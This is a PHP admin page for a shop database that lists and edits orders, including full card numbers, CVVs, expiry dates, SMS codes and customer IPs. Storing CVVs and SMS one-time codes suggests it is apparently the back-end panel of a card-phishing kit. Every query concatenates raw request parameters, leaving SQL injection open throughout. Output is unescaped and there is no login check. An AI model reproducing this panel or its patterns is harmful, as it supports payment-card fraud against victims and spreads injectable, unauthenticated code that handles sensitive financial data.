<?php
$con=  mysqli_connect("127.0.0.1", "root","" , "bestfashop");
mysqli_query($con,"SET CHARACTER SET 'utf8'");
session_start();

?>







<?php


	if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update orderclien set  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',   id='".$_POST['id']."',    img='".$_POST['img']."',     title='".$_POST['title']."',    	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	subtotal='".$_POST['subtotal']."',	  totalprice='".$_POST['totalprice']."',  totalitem='".$_POST['totalitem']."',      email='".$_POST['email']."',	firstname='".$_POST['firstname']."',	lastname='".$_POST['lastname']."',	address='".$_POST['address']."',	city='".$_POST['city']."',	country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."',	codesms='".$_POST['codesms']."'        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
	if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from orderclien where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
	if(isset($_POST['clear']))  {	if(     mysqli_query( $con  ,  "  delete from orderclien "   )  )        {header("location:admin.php");} else { header("location:admin.php");}        }	  


	$result  =  mysqli_query(      $con   ,     "select * from orderclien "           );
	foreach($result as $row)	
	{	
	
	
		$datetime= $row["datetime"];
		$ip= $row["ip"];
		$id= $row["id"];	
		$img= $row["img"];
		$title= $row["title"];
		$price1= $row["price1"];
		$quantity= $row["quantity"];				
		$color= $row["color"];					
		$sizee= $row["sizee"];		
		$shipping= $row["shipping"];				
		$subtotal= $row["subtotal"];
		$totalprice= $row["totalprice"]; 
		$totalitem= $row["totalitem"];			
		$email= $row["email"];		
		$firstname= $row["firstname"];				
		$lastname= $row["lastname"];			
		$address= $row["address"];			
		$city= $row["city"];			
		$country= $row["country"];				
		$postcode= $row["postcode"];					
		$phone= $row["phone"];			
		$nameoncard= $row["nameoncard"];			
		$cardnumber= $row["cardnumber"];			
		$expmm= $row["expmm"];			
		$expyy= $row["expyy"];			
		$cvv= $row["cvv"];			
		$codesms= $row["codesms"];
		
	?>
	    <form method="post"  action="?ID=<?php echo $row["id"] ?>"    >
            <input type="text"   value="<?php echo $datetime ?>"    name="datetime" /> <br/> 
            <input type="text"   value="<?php echo $ip ?>"          name="ip" /><br/>
			<input type="text"   value="<?php echo $id ?>"          name="id" /><br/>
			<input type="file"   name="img"    /><br/>
			<input type="text"   value="<?php echo $title ?>"       name="title" /><br/> 
			<input type="text"   value="<?php echo $price1 ?>"      name="price1" /><br/> 
			<input type="text"   value="<?php echo $quantity ?>"    name="quantity" /><br/> 
			<input type="text"   value="<?php echo $color ?>"       name="color" /><br/> 
			<input type="text"   value="<?php echo $sizee ?>"       name="sizee" /><br/> 
			<input type="text"   value="<?php echo $shipping ?>"    name="shipping" /><br/> 
			<input type="text"   value="<?php echo $subtotal ?>"    name="subtotal" /><br/> 
			<input type="text"   value="<?php echo $totalprice ?>"  name="totalprice" /><br/> 
			<input type="text"   value="<?php echo $totalitem ?>"   name="totalitem" /><br/> 
			<input type="text"   value="<?php echo $email ?>"       name="email" /><br/> 
			<input type="text"   value="<?php echo $firstname ?>"   name="firstname" /><br/> 
			<input type="text"   value="<?php echo $lastname ?>"    name="lastname" /><br/> 
			<input type="text"   value="<?php echo $address ?>"     name="address" /><br/> 
			<input type="text"   value="<?php echo $city ?>"        name="city" /><br/> 
			<input type="text"   value="<?php echo $country ?>"     name="country" /><br/> 
			<input type="text"   value="<?php echo $postcode ?>"    name="postcode" /><br/> 
			<input type="text"   value="<?php echo $phone ?>"       name="phone" /><br/> 
			<input type="text"   value="<?php echo $nameoncard ?>"  name="nameoncard" /><br/> 
			<input type="text"   value="<?php echo $cardnumber ?>"  name="cardnumber" /><br/> 
			<input type="text"   value="<?php echo $expmm ?>"       name="expmm" /><br/> 
			<input type="text"   value="<?php echo $expyy ?>"       name="expyy" /><br/> 
			<input type="text"   value="<?php echo $cvv ?>"         name="cvv" /><br/> 
			<input type="text"   value="<?php echo $codesms ?>"     name="codesms" /><br/> 
						
			<input type="submit" value="update"  name="update"/>	
            <input type="submit" value="delete"  name="delete"/>	
  			<br/> <br/>	
	<?php } ?>
		    <input type="submit" value="clear"  name="clear"/>
		</form>	
	<?php
?>








